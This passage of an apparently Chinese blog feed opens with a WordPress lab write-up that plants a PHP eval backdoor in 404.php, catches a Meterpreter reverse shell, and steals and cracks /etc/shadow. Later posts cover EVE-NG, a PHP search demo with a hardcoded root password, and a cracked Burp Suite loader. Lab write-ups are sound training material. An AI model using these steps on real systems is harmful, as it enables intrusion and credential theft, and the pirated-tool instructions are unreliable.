punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$suhosin_bypass</span><span class="token operator">=</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$suhosin_bypass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后按照下面操作顺序操作即可。</p><p><img src="/images/wordimage/2022/228/php.png"></p><p>然后访问<code>404.php</code>即可，访问路径是<code>IP地址/secret/wp-content/themes/twentyseventeen/404.php</code>。</p><p>如下图，访问，什么都没有，证明成功了👇。</p><p><img src="/images/wordimage/2022/228/404php.png"></p><h3 id="2-获取shell"><a href="#2-获取shell" class="headerlink" title="2.获取shell"></a>2.获取shell</h3><p>按照如下输入，开启监听👇</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">></span> use exploit/multi/handler <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcpmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">></span> php/meterpreter/reverse_tcpmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">4444</span>LPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">4444</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.205.78LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.205.78msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Handler failed to <span class="token builtin class-name">bind</span> to <span class="token number">192.168</span>.205.78:4444:-  -<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">0.0</span>.0.0:4444 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/wordimage/2022/228/hander.png"></p><p>然后在访问一下<code>404.php</code>即可获得，反弹shell。</p><p>成功获取shell之后就可以下载<code>/etc/passwd</code>和<code>/etc/shadow</code>文件即可，如下图。</p><p><img src="/images/wordimage/2022/228/download.png"></p><h3 id="3-合并文件"><a href="#3-合并文件" class="headerlink" title="3.合并文件"></a>3.合并文件</h3><p>直接如下图操作即可，合并文件，破解文件密码。<br><img src="/images/wordimage/2022/228/crack.png"></p><h3 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h3><p>先获取到www用户，然后在获取到bash窗口，命令如下👇。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"import pty; pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/228/bash.png"></p><p>然后切换到<code>marlinspike</code>用户，密码也是<code>marlinspike</code>。</p><p>直接使用<code>marlinspike</code>用户切换到root用户即可，没有限制，在<code>marlinspike</code>用户下面输入。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结束。</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVE-NG搭建Windows虚拟机超详细过程</title>
      <link href="/2022/0238d6efa2.html"/>
      <url>/2022/0238d6efa2.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>使用EVE-NG在网页上面实现虚拟机的操作，EVE-NG可以对很多设备进行仿真操作，这里用的系统是Windows7系统，如果你需要EVE-NG的虚拟机可以向我要索取，或者如下链接。</p><hr><h2 id="一-在VM虚拟机安装好Windows虚拟机"><a href="#一-在VM虚拟机安装好Windows虚拟机" class="headerlink" title="一.在VM虚拟机安装好Windows虚拟机"></a>一.在VM虚拟机安装好Windows虚拟机</h2><p>在VM安装虚拟机有一个，注意事项，就是需要设置单独文件，如下图👇所示，如果你不知道怎么搭建虚拟机可以看我的这篇文章道理是一样的👉<a href="https://blog.takagisan.top/2022/02e59b04a1.html">搭建虚拟机</a>。</p><p><img src="/images/wordimage/2022/228/xuniji.png"></p><p>Windows7安装完毕之后，我指的安装完毕指的是，能在VM虚拟机里面成功进去虚拟机。</p><hr><h2 id="二-配置虚拟机vmdk文件"><a href="#二-配置虚拟机vmdk文件" class="headerlink" title="二.配置虚拟机vmdk文件"></a>二.配置虚拟机vmdk文件</h2><p>虚拟机OK了之后，使用SSH连接到EVE-NG系统机器，然后这里我使用的是<code>Winscp</code>软件连接到EVE-NG，然后打开路径👉<code>/opt/unetlab/addons/qemu/</code>，然后在里面创建一个<code>win-7</code>的文件夹，必须是这样的格式如果你是win10系统就是，创建一个叫做<code>win-10</code> 的文件就可以了，如下图👇。</p><p><img src="/images/wordimage/2022/228/win-7.png"></p><p>之后，打开VM虚拟机的目录找到刚才创建的win7系统的vmdk文件，如下图👇，必须是一个vmdk文件，这个操作就是第一步的操作<code>将虚拟磁盘存储为单个文件</code>。</p><p><img src="/images/wordimage/2022/228/vmdk.png"></p><p>找到vmdk文件之后，我这里使用的是<code>winscp</code>工具，把整个<code>Windows7</code>虚拟机文件夹(估计会很大)复制到EVE-NG的👉<code>/opt/unetlab/addons/qemu/win-7/</code>文件夹里面去，也就是刚才我们创建的<code>win-7</code>文件夹，如下图👇。</p><p><img src="/images/wordimage/2022/228/win7.png"></p><h2 id="三-正式配置EVE-NG网页虚拟机"><a href="#三-正式配置EVE-NG网页虚拟机" class="headerlink" title="三.正式配置EVE-NG网页虚拟机"></a>三.正式配置EVE-NG网页虚拟机</h2><p>进入到EVE-NG虚拟机进入目录👉<code>/opt/unetlab/addons/qemu/win-7/Windows 7</code>，如果成功你应该和我一样，如下图。</p><p><img src="/images/wordimage/2022/228/xshell.png"></p><p>然后就在这个目录下面输入如下命令👇，下面的<code>hda.qcow2</code>必须是这个名字，不能更换，换了就出毛病，然后 <code>-O qcow</code>后面跟着的是vmdk的文件名。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/opt/qemu/bin/qemu-img convert -f vmdk -O qcow2 Windows<span class="token punctuation">\</span> <span class="token number">7</span>.vmdk hda.qcow2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有报错就是成功，然后就可以在<code>Windows7</code>目录下面发现一个hda.qcow2的文件，如下图👇。</p><p><img src="/images/wordimage/2022/228/qcow.png"></p><p>然后把这个<code>hda.qcow2</code>这个文件放入上级目录下面即可，如下图👇。</p><p>使用命令如下操作。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> hda.qcow2 <span class="token punctuation">..</span>/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图👇。</p><p><img src="/images/wordimage/2022/228/hda.png"></p><h2 id="四-在EVE-NG里面启动windows7虚拟机。"><a href="#四-在EVE-NG里面启动windows7虚拟机。" class="headerlink" title="四.在EVE-NG里面启动windows7虚拟机。"></a>四.在EVE-NG里面启动windows7虚拟机。</h2><p>上面三个步骤做完没有报错之后，就可以正式启动了，打开网页段EVE-NG，新建一个<code>node</code>，如下图。</p><p><img src="/images/wordimage/2022/228/node.png"></p><p>然后选择<code>windows</code>如下图👇。</p><p><img src="/images/wordimage/2022/228/windows.png"></p><p>然后选择系统，之后点击下面的<code>save</code>就可以了，如下图👇。</p><p><img src="/images/wordimage/2022/228/select7.png"></p><p><img src="/images/wordimage/2022/228/save.png"></p><p>创建好了之后直接，右键点击<code>start</code>即可，如下图，然后双击图标就可以进入系统了。</p><p><img src="/images/wordimage/2022/228/start.png"></p><h2 id="五-结果"><a href="#五-结果" class="headerlink" title="五.结果"></a>五.结果</h2><p>如下图就可以在网页里面访问虚拟机了。</p><p><img src="/images/wordimage/2022/228/jieguo.png"></p>]]></content>
      
      
      <categories>
          
          <category> 虚拟机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EVE-NG </tag>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用原生js+ajax+php+html+数据库进行数据交互实现搜索功能</title>
      <link href="/2022/0215b47666.html"/>
      <url>/2022/0215b47666.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近是要去Web前端开发的比赛，我一个学网安的，去做Web前端开发，我JS都没学过，然后花了两天时间恶补了JS，勉强写出了小功能，代码可能不好，如果有前端大佬建议欢迎留言ヾ(≧▽≦*)o。</p><hr><h2 id="一-实现过程"><a href="#一-实现过程" class="headerlink" title="一.实现过程"></a>一.实现过程</h2><h3 id="1-数据库"><a href="#1-数据库" class="headerlink" title="1.数据库"></a>1.数据库</h3><p>这里使用的是PHP调用数据库数据来进行的交互，数据库查询如下图👇,是某些城市的名称。</p><p><img src="/images/wordimage/2022/226/shujukuchaxun.png"></p><h3 id="2-PHP代码"><a href="#2-PHP代码" class="headerlink" title="2.PHP代码"></a>2.PHP代码</h3><p>PHP代码我是抄的菜鸟教程的代码，然后稍作修改弄的如下图👇。</p><blockquote><p>​    database.php</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123.com"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"search"</span><span class="token punctuation">;</span><span class="token comment">// 创建连接</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Check connection</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败: "</span> <span class="token operator">.</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//接口格式json</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>search.php</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">use</span> <span class="token keyword">function</span> <span class="token package">PHPSTORM_META<span class="token punctuation">\</span>type</span><span class="token punctuation">;</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Access-Control-Allow-Origin: * "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Header("Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE");</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"database.php"</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM `list`"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//存储一个数组</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 输出数据</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">;</span>        <span class="token comment">// var_dump($title);</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span> <span class="token variable">$title</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"0 结果"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//输出接口数据</span><span class="token comment">// echo $arr;</span><span class="token comment">// var_dump($arr);</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token comment">//关闭连接</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-html-js代码"><a href="#3-html-js代码" class="headerlink" title="3.html + js代码"></a>3.html + js代码</h3><blockquote><p>index.html</p></blockquote><p>因为啥也不懂，就写了很多的注释来提醒自己了。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- &lt;script src="/DelphiRequest/search/js/jquery.js">&lt;/script> --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">        <span class="token keyword">function</span> <span class="token function">showResult</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> xmlhttp<span class="token punctuation">;</span>            <span class="token comment">//如果传参的str长度为0也就是没有传参</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">//那么在对应的ID后面添加文本为空</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"livesearch"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                <span class="token comment">//效果也为空</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"livesearch"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>border <span class="token operator">=</span> <span class="token string">"0px"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// IE7+, Firefox, Chrome, Opera, Safari 浏览器执行</span>                xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">// IE6, IE5 浏览器执行</span>                xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"Microsoft.XMLHTTP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//onreadystatechange的意思是当readyState改变的时候就会调用</span>            xmlhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">/*                    下面的readyState == 4代表请求完成，并且响应值是200(.status)                    0代表没有初始化                    1代表服务器连接建立                    2代表请求接受                    3代表请求处理中                */</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> xmlhttp<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">//获取数据</span>                    <span class="token keyword">let</span> res <span class="token operator">=</span> xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>         <span class="token comment">//XMLHttpRequest.responseText 在一个请求被发送后，从服务器端返回文本</span>                    res <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">//把接口返回的数据转换成json格式</span>                    <span class="token keyword">var</span> shuzu <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                         <span class="token comment">//定义一个数组变量shuzu         //还可以这样var shuzu = new Array();</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> res<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//循环输出res json数据，获取里面的name</span>                        shuzu<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//然后把name的值放进shuzu这个数组里面</span>                    <span class="token punctuation">&#125;</span>                    <span class="token comment">//实现前端搜索</span>                    <span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                           <span class="token comment">//定义一个空数组</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> shuzu<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token comment">//如果字符串中不包含目标字符会返回-1</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>shuzu<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//实现搜索功能</span>                            arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>shuzu<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token comment">//getElementById应该是找到id为livesearch然后innerHTML的意思是在里面添加文本</span>                    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"livesearch"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> arr<span class="token punctuation">;</span>                    <span class="token comment">//.style.border应该是找到对应ID添加对应CSS效果</span>                    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"livesearch"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>border <span class="token operator">=</span> <span class="token string">"1px solid #A5ACB2"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"search.php"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//用jquery实现</span>        <span class="token comment">// function showResult(str) &#123;</span>        <span class="token comment">//     $.ajax(&#123;</span>        <span class="token comment">//         type: "GET",</span>        <span class="token comment">//         url: "livesearch.php",</span>        <span class="token comment">//         datatype: 'json',</span>        <span class="token comment">//         data: &#123; 'q': str &#125;,</span>        <span class="token comment">//         success: function (data) &#123;</span>        <span class="token comment">//             document.getElementById("livesearch").innerHTML = data;</span>        <span class="token comment">//             document.getElementById("livesearch").style.border = "1px solid #A5ACB2";</span>        <span class="token comment">//         &#125;</span>        <span class="token comment">//     &#125;)</span>        <span class="token comment">// &#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- this.value我猜测是输入的值，onkeyup是松开按键就执行函数，并且把输入的值带入进去 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onkeyup</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">showResult</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>livesearch<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-效果。"><a href="#4-效果。" class="headerlink" title="4.效果。"></a>4.效果。</h3><p>如下图👇，到现在我还不知道怎么实现换行，有大神知道可以留言ヾ(≧▽≦*)o。</p><p><img src="/images/wordimage/2022/226/beijing.png"></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> PHP </tag>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绊爱！呜呜呜！希望绊爱从无限期休眠中醒来！</title>
      <link href="/2022/02b73266fe.html"/>
      <url>/2022/02b73266fe.html</url>
      
        <content type="html"><![CDATA[<p>2022年2月26日，绊爱官方发出最后一条休眠动态。</p><p><img src="/images/wordimage/2022/031/kizai.png"></p><p>各位大家的不舍。</p><p><img src="/images/wordimage/2022/031/ai2.png"></p><p><img src="/images/wordimage/2022/031/ai3.png"></p><p><img src="/images/wordimage/2022/031/ai4.png"></p><p><img src="/images/wordimage/2022/031/ai5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 绊爱 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>burpsuit的安装以及常见问题的解决办法</title>
      <link href="/2022/02c886b5d6.html"/>
      <url>/2022/02c886b5d6.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Windows上面安装2021.12版本的burpsuit破解版</p><p>链接：<a href="https://pan.baidu.com/s/1AjUOoQOhrnidvb9y7isIPw">https://pan.baidu.com/s/1AjUOoQOhrnidvb9y7isIPw</a><br>提取码：u90k</p><hr><h2 id="一-下载Burpsuit"><a href="#一-下载Burpsuit" class="headerlink" title="一.下载Burpsuit"></a>一.下载Burpsuit</h2><p>在学习的时候，在网上找到了一个2021.12月份版本的Burpsuit工具，工具下载链接如下👇。</p><p>个人地址下载:<a href="http://img.takagisan.top/burp2021.5.zip">下载地址</a></p><p>链接是我已经配置完毕，可以直接打开就可以使用了</p><hr><h2 id="二-使用Burpsuit"><a href="#二-使用Burpsuit" class="headerlink" title="二.使用Burpsuit"></a>二.使用Burpsuit</h2><p>下载完毕之后直接，打开<code>BurpSuiteLoader.bat</code>即可，如果报错，<code>A JNI error has occurred, please check your installation and try again</code>，可以安装，最新版本的<code>java</code>，在压缩包里面有安装包，安装之后即可解决。</p><p>如果安装完毕之后出现了如下图的报错👇。</p><p><img src="/images/wordimage/2022/225/burp.png"></p><p>可以打开<code>BurpSuiteLoader.bat</code>，然后添加如下两句代码在如下图箭头所示位置</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">--illegal-access=permit-add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/wordimage/2022/225/burpsearch.png"></p><p>就可以成功打开了。</p><hr><h3 id="1-解决报错"><a href="#1-解决报错" class="headerlink" title="1.解决报错"></a>1.解决报错</h3><p>其实这个标题可以不用创建的，如果你使用的过程中出现了如下图报错👇，看百度说是删除掉<code>C:\Windows\System32下的java.exe、javaw.exe、javaws.exe</code>就可以解决，但是我不行。</p><p><img src="/images/wordimage/2022/225/baocuo.png"></p><p>然后最好的解决办法是，在burpsuit目录下面创建一个bat文件内容如下👇。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">start "burpsuite" /B "javaw.exe" --illegal-access=permit -Xmx8G -XX:-UseParallelGC -noverify --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -javaagent:BurpSuiteLoader_v2021.12.jar -Dfile.encoding=utf-8 -jar "%~dp0burpsuite_pro_v2021.12.jar" %*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图结果👇，如果你遇到了什么问题，可以在下面评论讨论，或者联系我，一起解决，说不定我知道呢(～￣▽￣)～。</p><p><img src="/images/wordimage/2022/225/startburp.png"></p><hr><h2 id="三-Burpsuit激活"><a href="#三-Burpsuit激活" class="headerlink" 